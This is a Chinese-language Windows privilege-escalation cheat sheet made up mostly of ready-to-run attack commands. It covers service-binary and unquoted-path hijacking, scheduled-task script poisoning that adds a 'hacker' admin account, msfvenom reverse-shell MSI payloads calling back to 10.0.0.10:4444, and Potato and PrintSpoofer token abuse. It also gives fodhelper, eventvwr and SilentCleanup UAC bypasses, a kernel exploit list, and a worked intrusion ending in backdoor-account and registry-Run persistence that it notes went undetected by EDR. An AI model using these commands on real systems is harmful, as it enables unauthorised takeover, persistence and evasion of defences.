# Windows 提权手法速查手册

---

## 📋 目录

1. [信息收集](#一信息收集)
2. [服务提权](#二服务提权)
3. [计划任务提权](#三计划任务提权)
4. [注册表提权](#四注册表提权)
5. [令牌窃取](#五令牌窃取)
6. [UAC 绕过](#六uac-绕过)
7. [内核漏洞提权](#七内核漏洞)
8. [AlwaysInstallElevated](#八alwaysinstallelevated)
9. [完整案例](#九完整案例)

---

## 一、信息收集

```powershell
# === 一键收集 ===
# WinPEAS — Windows 提权信息收集神器
# https://github.com/carlospolop/PEASS-ng
winPEASx64.exe

# PowerUp — PowerSploit 提权模块
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — C# 信息收集
Seatbelt.exe -group=all

# ===== 手工信息收集 =====
systeminfo                                         # 补丁情况
hostname && whoami /all                             # 当前用户
net user                                           # 本地用户
net localgroup Administrators                      # 管理员组
whoami /priv                                       # 当前权限(特权)

# 补丁查询（→ 缺失补丁 → 可能的内核exploit）
wmic qfe get Caption,Description,HotFixID,InstalledOn
# 或:
systeminfo > sys.txt
# 用 Windows-Exploit-Suggester 分析:
python wes.py sys.txt -i "Elevation of Privilege"

# 计划任务
schtasks /query /fo LIST /v

# 服务
wmic service get name,displayname,pathname,startmode,startname

# 自启动
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 文件权限
icacls "C:\Program Files\VulnerableApp\vuln.exe"
# 查找可写文件:
accesschk.exe -uwcqv "Authenticated Users" *
```

---

## 二、服务提权

### 2.1 可写服务路径

```powershell
# === 原理 ===
# 服务路径可写 → 替换服务程序 → SYSTEM权限

# === 检测 ===
wmic service get name,pathname,startname | findstr /i "localsystem" | findstr /v "C:\Windows"
# 找路径不在 C:\Windows\ 的 SYSTEM 服务

# === PowerUp 检测 ===
Invoke-AllChecks | Where-Object {$_.Check -eq "Unquoted Service Path"}

# === 利用 ===
# 例: 服务路径 C:\Program Files\Vuln\service.exe
#    但 C:\Program Files\Vuln\ 可写!

# 上传恶意exe:
copy evil.exe "C:\Program Files\Vuln\service.exe"
# 重启服务 → SYSTEM权限执行evil.exe

# 或: sc start ServiceName
net start ServiceName
```

### 2.2 未引用路径 (Unquoted Service Path)

```powershell
# 服务路径无引号:
# C:\Program Files\Vuln Services\Service.exe
# Windows 尝试执行(按顺序):
# ① C:\Program.exe         ← 可写?
# ② C:\Program Files\Vuln.exe  ← 可写?
# ③ C:\Program Files\Vuln Services\Service.exe

# 如果②的目录 C:\Program Files\ 可写(需要高权限通常不可)
# 放入 Vuln.exe → 被当作服务程序执行

# PowerUp 检测:
Get-UnquotedService
Write-ServiceBinary -Name 'VulnService' -Path "C:\Program Files\Vuln\Vuln.exe"
```

### 2.3 服务配置可修改

```powershell
# 当前用户可修改服务配置
# 权限: SERVICE_CHANGE_CONFIG

# sc 命令修改
sc config VulnService binPath= "C:\Windows\Temp\evil.exe"
sc start VulnService
# → SYSTEM 权限执行 evil.exe

# PowerUp:
Invoke-AllChecks  # 检测
# 如果发现可修改的服务:
Set-ServiceBinaryPath -Name 'VulnService' -Path 'C:\Windows\Temp\evil.exe'
```

---

## 三、计划任务提权

```powershell
# ===== 可写计划任务脚本 =====
schtasks /query /fo LIST /v

# 查找以SYSTEM运行的计划任务
# 检查任务对应的脚本/程序路径是否可写
icacls "C:\Scripts\backup.bat"

# 如果可写:
echo "net user hacker P@ssw0rd123 /add" >> "C:\Scripts\backup.bat"
echo "net localgroup Administrators hacker /add" >> "C:\Scripts\backup.bat"
# → 等待计划任务执行 → hacker获得管理员权限
```

---

## 四、注册表提权

```powershell
# ===== AlwaysInstallElevated =====
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两个都返回 0x1 → 可提权!

# 制作恶意MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
# → 以 SYSTEM 权限执行 payload!

# ===== 注册表自启动 =====
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# 如果可写:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
    /v Update /t REG_SZ /d "C:\Windows\Temp\evil.exe"
```

---

## 五、令牌窃取

```powershell
# ===== 土豆系列 (Juicy/Rotten/Sweet Potato) =====
# 前提: SeImpersonatePrivilege
whoami /priv | findstr "SeImpersonate"

# JuicyPotato (Windows < 10 1809)
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -l 1337
# → SYSTEM 权限!

# PrintSpoofer (Windows 10+, Server 2016+)
PrintSpoofer.exe -i -c cmd.exe
# → SYSTEM 权限!

# RoguePotato (Windows 10 1809+)
RoguePotato.exe -r 10.0.0.10 -e "C:\Windows\System32\cmd.exe" -l 9999

# SweetPotato (多方法组合)
SweetPotato.exe -p "C:\Windows\System32\cmd.exe"
```

---

## 六、UAC 绕过

```powershell
# UAC (User Account Control) — 获取管理员权限(非SYSTEM)

# 前提: 当前用户在本地 Administrators 组
net localgroup Administrators

# ===== fodhelper 绕过 (Win10/11) =====
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\System32\cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
# → 弹UAC确认框 → 以管理员权限打开cmd

# ===== eventvwr 绕过 =====
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Windows\System32\cmd.exe" /f
eventvwr.exe

# ===== SilentCleanup 绕过 =====
reg add HKCU\Environment /v windir /d "cmd.exe /c C:\Windows\Temp\evil.exe & " /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# ===== UACME — 聚合 UAC 绕过工具(50+方法) =====
Akagi64.exe 61  # 方法61: fodhelper
Akagi64.exe 23  # 方法23
```

---

## 七、内核漏洞

### 7.1 常用 Exploit

| 漏洞/MS编号 | 影响系统 | 类型 |
|------------|---------|------|
| MS16-032 | Win7/8/10, 2008/2012 | 辅助登录服务 |
| MS16-135 | Win7/8.1/10, 2008-2016 | Win32k |
| CVE-2020-0787 | Win7-10, 2008-2019 | BITS服务 |
| CVE-2021-1732 | Win10/2016/2019 | Win32k |
| CVE-2021-36934 | Win10/11 18H2+ | SAM文件(HiveNightmare) |
| CVE-2022-21882 | Win10/11, 2022 | Win32k |
| CVE-2023-21768 | Win10/11, 2022 | AFD.sys |

### 7.2 自动化利用

```powershell
# Watson — 补丁匹配查找可能的内核漏洞
Watson.exe

# Windows Exploit Suggester - Next Gen
# https://github.com/bitsadmin/wesng
wes.py systeminfo.txt --impact "Elevation of Privilege" -e

# Sherlock — 检测特定漏洞
Import-Module .\Sherlock.ps1
Find-AllVulns
```

---

## 八、AlwaysInstallElevated

```powershell
# 如果未启用但可修改注册表：
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1

# msfvenom 生成 msi:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f msi -o p.msi
msiexec /quiet /qn /i p.msi
# → SYSTEM shell!
```

---

## 九、完整案例

```
场景: Windows Server 2016 标准用户 → SYSTEM

Phase 1: 信息收集
  whoami → WIN-SVR\sql_user
  whoami /priv → SeImpersonatePrivilege: Enabled
  systeminfo → 补丁打到2025年，无已知内核漏洞
  → 方向: 令牌窃取提权

Phase 2: JuicyPotato 尝试
  JuicyPotato.exe -t * -p cmd.exe -l 1337
  → 失败 (系统时钟需与目标一致)

Phase 3: PrintSpoofer 尝试
  PrintSpoofer.exe -i -c cmd.exe
  → whoami → nt authority\system
  → 成功! 获得 SYSTEM 权限!

Phase 4: 持久化
  ① 创建管理员用户:
     net user backup_admin P@ssw0rd! /add
     net localgroup Administrators backup_admin /add
  ② 注册表后门:
     reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run ...

从标准用户 → 管理员 → SYSTEM: 15分钟

关键因素:
  ✓ SeImpersonatePrivilege (SQL Server服务账户常见)
  ✓ PrintSpoofer 适用 (Win10/Server 2016+)
  ✓ 无EDR检测到 (令牌操作较隐蔽)
```

---

## ✅ Checklist

- [ ] 运行 WinPEAS / PowerUp / Seatbelt
- [ ] whoami /priv (尤其是 SeImpersonate/SeAssignPrimaryToken)
- [ ] systeminfo → 补丁审计
- [ ] 服务检查（路径/配置/权限）
- [ ] 计划任务脚本权限
- [ ] AlwaysInstallElevated 注册表
- [ ] 未引用服务路径
- [ ] 自启动注册表可写性
- [ ] UAC 绕过（如在管理员组）
